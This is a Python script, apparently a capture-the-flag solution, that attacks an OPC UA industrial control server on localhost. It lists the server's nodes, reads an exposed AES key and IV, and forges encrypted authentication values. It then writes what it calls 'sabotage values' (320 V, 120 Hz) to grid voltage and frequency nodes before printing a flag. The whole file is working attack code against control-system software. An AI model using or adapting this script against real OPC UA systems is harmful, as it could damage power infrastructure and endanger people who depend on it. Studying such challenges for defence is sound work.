#!/usr/bin/python3
from opcua import Client
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64
import time

def enc(d, k, v):
    c = AES.new(k, AES.MODE_CBC, v)
    e = c.encrypt(pad(d.encode(), 16))
    return base64.b64encode(e).decode()

cl = Client("opc.tcp://localhost:4840")

try:
    cl.connect()
    print("Connected")

    # Enumeration
    
    ns = cl.get_namespace_array()
    sec = ns.index("Security")
    aut = ns.index("Authentication")
    dia = ns.index("Diagnostics")
    grd = ns.index("Grid")

    o = cl.get_root_node().get_child(["0:Objects"])
    nd = {}

    for f in o.get_children():
        fn = f.get_browse_name().Name
        if fn in ["Security", "Authentication", "Diagnostics", "Grid"]:
            for ch in f.get_children():
                cn = ch.get_browse_name().Name
                print(f"{fn} : {cn}")
                try:
                    val = ch.get_value()
                    nd[f"{fn}/{cn}"] = ch
                except:
                    pass
                
    # Values of the secuirty namespace
    
    cipher = nd["Security/Cipher"].get_value()            
    k = nd["Security/Key"].get_value()
    cipher_mode = nd["Security/CipherMode"].get_value()  
    v = nd["Security/IV"].get_value()
    encd = nd["Security/Encoding"].get_value()

    print(f"Security: Cipher={cipher}, Key={k}, Cipher Mode={cipher_mode},  IV={v}, Enc={encd}")
    
    # Authenticate with the certificate

    el = nd["Diagnostics/ErrorLog"]
    cn = nd["Authentication/CommonName"]
    org = nd["Authentication/Organization"]
    sn = nd["Authentication/SerialNumber"]

    cn.set_value(f"{enc('test', k, v)}")
    org.set_value(f"{enc('test', k, v)}")
    sn.set_value(f"{enc('test', k, v)}")
    print("Sent invalid encrypted auth values to observe behavior")
    time.sleep(2)

    # Take the correct values from the server's output

    err = el.get_value()
    
    print(f"Error: {err}")

    cn_val = "GridCrypOp"
    org_val = "VolnayaOrg"
    sn_val = "981337"

    ecn = enc(cn_val, k, v)
    eorg = enc(org_val, k, v)
    esn = enc(sn_val, k, v)

    cn.set_value(ecn)
    org.set_value(eorg)
    sn.set_value(esn)
    print("Sent correct auth values\n")
    
    # Grid values
    
    time.sleep(2)

    vol = nd["Grid/Voltage"]
    freq = nd["Grid/Frequency"]
    fl = nd["Grid/Log"]

    evol = enc("320", k, v)
    efreq = enc("120", k, v)

    vol.set_value(evol)
    freq.set_value(efreq)
    print("Sent sabotage values")
    time.sleep(3)

    fl_val = fl.get_value()
    print(f"Flag: {fl_val}")

except Exception as e:
    print(f"Err: {e}")
finally:
    try:
        cl.disconnect()
    except:
        pass
    print("Disconnected")